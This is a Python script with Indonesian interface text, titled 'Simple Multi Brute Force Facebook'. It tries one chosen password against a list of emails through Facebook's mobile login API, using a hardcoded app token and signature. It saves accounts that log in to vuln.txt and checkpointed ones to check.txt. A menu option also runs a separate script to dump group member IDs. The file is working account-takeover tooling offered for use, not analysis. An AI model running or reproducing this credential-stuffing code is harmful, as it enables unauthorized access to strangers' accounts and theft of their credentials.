import os,sys,time,requests,json,re
from bs4 import BeautifulSoup as parser
from time import sleep
from concurrent.futures import ThreadPoolExecutor

count=0
result=0
chek=0
die=0
check=[]
vuln=[]
cek = open("cookies").read()

def banner ():
 print("")
 print("•••••••••••••••••••••••••••••••••••••••••••••••••••••••••")
 print("            SIMPLE MULTI BRUTE FORCE FACEBOOK")
 print("•••••••••••••••••••••••••••••••••••••••••••••••••••••••••")
 print("")
 print("Pembuat : Dede Andrii")
 print("Contact : t.me/abahzeus")
def login (cek=False):
    os.system("clear")
    banner()
    a = input("Lokasi File : ")
    b = input("Kata Sandi : ")
    c = open(a).read()
    for emel in c.splitlines():
        global die,result,chek,count
        d ="350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
        params = {
            'access_token': d,
            'format': 'JSON',
            'sdk_version': '2',
            'email': emel,
            'locale': 'en_US',
            'password': b,
            'sdk': 'ios',
            'generate_session_cookies': '1',
            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'
            
        }
        api = 'https://b-api.facebook.com/method/auth.login'
        response = requests.get(api, params=params)
        if 'EAA' in response.text:
            print(f"\r\033[00m[\033[1;32m✓\033[00m] \033[1;32m{emel}\033[90m|\033[1;32m{b}                        ",end="")
            print()
            result =+1
            if cek:
                vuln.append(emel+"|"+b)
            else:
                with open('vuln.txt','a') as f:
                    f.write(emel + '|' + b + '\n')
        elif 'www.facebook.com' in response.json()['error_msg']:
            print(f"\r\033[00m[\033[1;91mx\033[00m] \033[1;33m{emel}\033[90m|\033[1;33m{b}                      ",end="")
            print()
            cek =+1
            if cek:
                check.append(emel+"|"+b)
            else:
                with open('check.txt','a') as f:
                    f.write(emel + '|' + b + '\n')
        else:
            die += 1
            tk=['\033[1;97m#','\033[1;96m#','\033[1;97m#','\033[1;91m#']
            for o in tk:
                print(f"\r\033[00m[{o}\033[00m] Life : \033[1;92m{str(result)} \033[00mCheck : \033[1;93m{str(chek)} \033[00mDie : \033[1;91m{str(die)}\033[00m",end="")
                time.sleep(0.)
                
                
def dump ():
 os.system("clear")
 print("")
 print("Lisensi:")
 print("")
 print("ghjknbbjgvbvvjnbgjn")
 print("")
 print("Salin Lisensi diatas lau Masukan dan Enter")
 print("")
 os.system("python2 dump.py")
 
 
#MENU

os.system("clear")
banner()
print("[1] . Mulai Simple Multi Brute Force Facebook")
print("[2] . Dump ID Group Dulu")
print("[3] . Keluar")
pilih = input("Masukkan Pilihan : ")
if pilih == '1':
 login()
elif pilih == '2':
 dump()
else:
 exit()